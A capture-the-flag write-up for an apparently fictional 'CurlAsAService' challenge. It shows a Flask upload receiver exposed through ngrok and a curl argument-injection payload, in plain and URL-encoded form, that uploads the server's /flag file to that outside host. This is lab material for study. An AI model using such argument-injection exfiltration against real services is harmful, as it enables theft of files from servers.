# CurlAsAService

### CHALLENGE DESCRIPTION

cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.



> I approached a black box testing on the challenge



## Website

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>curl</p></figcaption></figure>

* A simple curl request that will get the frontend src code
* There are many ways to solve this challenge
* I will make a flask app that handles put request and tell curl to put the file on my app



### Flask app

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['PUT'])
def upload_file():
    uploaded_file = request.files['file']

    if uploaded_file:
        file_path = f"./uploads/{uploaded_file.filename}"
        uploaded_file.save(file_path)

        return f"File '{uploaded_file.filename}' uploaded successfully.\n"
    else:
        return "No file received in the request.\n", 400

if __name__ == '__main__':
    app.run(debug=False)
```



* After this start ngrok on port 5000
* run the app.py file

### Payload

```bash
-X PUT -F "file=@/flag"  https://f9e2-122-177-22-17.ngrok-free.app/upload
```

* breakdown:
  * **-X PUT** : this will tell curl what http method to use
  * **-F "file=@/flag"** : This will tell curl what file to upload (-F is basically to mention we are using file)
* Turn on burspsuite and url encode the above payload

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

```bash
-X+PUT+-F+"file%3d%40/flag"++https%3a//f9e2-122-177-22-17.ngrok-free.app/upload
```

## pwned

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
